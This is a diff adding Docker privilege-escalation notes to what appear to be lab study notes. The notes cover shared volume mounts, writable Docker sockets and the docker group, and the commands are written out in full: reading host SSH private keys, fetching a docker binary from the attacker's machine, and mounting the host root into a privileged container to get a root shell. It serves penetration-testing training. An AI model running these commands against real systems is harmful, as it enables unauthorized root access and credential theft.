@@ -155,3 +155,93 @@ container-user@nix02:~$ lxc exec privesc /bin/bash
 container-user@nix02:~$ lxc exec privesc /bin/sh
 root@nix02:~# ls -l /mnt/root                    
 ```
+
+## Docker
+
+Docker is a popular open-source tool that provides a portable and consistent runtime environment for software applications. It uses containers as isolated environments in user space that run at the operating system level and share the file system and system resources.
+
+the docker archit. has  two primary components:
+
+* The Docker daemon
+* The Docker client
+
+The Docker client acts as our interface for issuing commands and interacting with the Docker ecosystem, while the Docker daemon is responsible for executing those commands and managing containers.
+
+When we interact with Docker, we issue commands through the `Docker Client`, which communicates with the Docker Daemon (through a `RESTful API` or a `Unix socket`) and serves as our primary means of interacting with Docker.
+
+#### Privesc (**Shared Directories)**
+
+shared directories (volume mounts) can bridge the gap between the host system and the container's filesystem. With shared directories, specific directories or files on the host system can be made accessible within the container.
+
+When we get access to the docker container and enumerate it locally, we might find additional (non-standard) directories on the docker’s filesystem.
+
+```shell-session
+root@container:~$ cd /hostsystem/home/cry0l1t3
+drwxr-x--- 10 cry0l1t3 cry0l1t3   4096 Jun 30 15:09 .ssh
+root@container:/hostsystem/home/cry0l1t3$ cat .ssh/id_rsa
+```
+
+From here on, we could copy the contents of the private SSH key to `cry0l1t3.priv` file and use it to log in as the user `cry0l1t3` on the host system.
+
+#### Privesc (**Sockets)**
+
+A Docker socket or Docker daemon socket is a special file that allows us and processes to communicate with the Docker daemon. This communication occurs either through a Unix socket or a network socket, depending on the configuration of our Docker setup.
+
+When we issue a command through the Docker CLI, the Docker client sends the command to the Docker socket, and the Docker daemon, in turn, processes the command and carries out the requested actions.
+
+```shell-session
+htb-student@container:~/app$ ls -al
+srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock
+```
+
+From here on, we can use the `docker` to interact with the socket and enumerate what docker containers are already running. If not installed, then we can download it [here](https://master.dockerproject.org/linux/x86\_64/docker) and upload it to the Docker container.
+
+```shell-session
+htb-student@container:/tmp$ wget https://<parrot-os>:443/docker -O docker
+htb-student@container:/tmp$ chmod +x docker
+htb-student@container:/tmp$ ls -l
+-rwxr-xr-x 1 htb-student htb-student 0 Jun 30 15:27 docker
+htb-student@container:~/tmp$ /tmp/docker -H unix:///app/docker.sock ps
+```
+
+We can create our own Docker container that maps the host’s root directory (`/`) to the `/hostsystem` directory on the container and full access to the host system.
+
+```shell-session
+htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
+htb-student@container:~/app$ /tmp/docker -H unix:///app/docker.sock ps
+CONTAINER ID     IMAGE         COMMAND                 CREATED           STATUS           PORTS     NAMES
+7ae3bcc818af     main_app      "/docker-entry.s..."    12 seconds ago    Up 8 seconds     443/tcp   app
+```
+
+&#x20;we can log in to the new privileged Docker container with the ID `7ae3bcc818af` and navigate to the `/hostsystem`.
+
+```shell-session
+htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
+root@7ae3bcc818af:~# cat /hostsystem/root/.ssh/id_rsa
+```
+
+#### Privesc (**Groups)**
+
+To gain root privileges through Docker, the user we are logged in with must be in the `docker` group (`id` command to check). This allows him to use and control the Docker daemon.
+
+Alternatively, Docker may have SUID set, or we are in the Sudoers file, which permits us to run `docker` as root.
+
+To see which images exist and which we can access ->
+
+```shell-session
+docker-user@nix02:~$ docker image ls
+```
+
+#### Privesc (**Socket)**
+
+A case that can also occur is when the Docker socket is writable. Usually, this socket is located in `/var/run/docker.sock`
+
+If we act as a user, not in one of these two groups (root or docker group), and the Docker socket still has the privileges to be writable, then we can still use this case to escalate our privileges.
+
+```shell-session
+docker-user@nix02:~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
+```
+
+_**Escalate the privileges on the target and obtain the flag.txt in the root directory. Submit the contents as the answer.**_
+
+<figure><img src="../../../.gitbook/assets/image (1476).png" alt=""><figcaption></figcaption></figure>
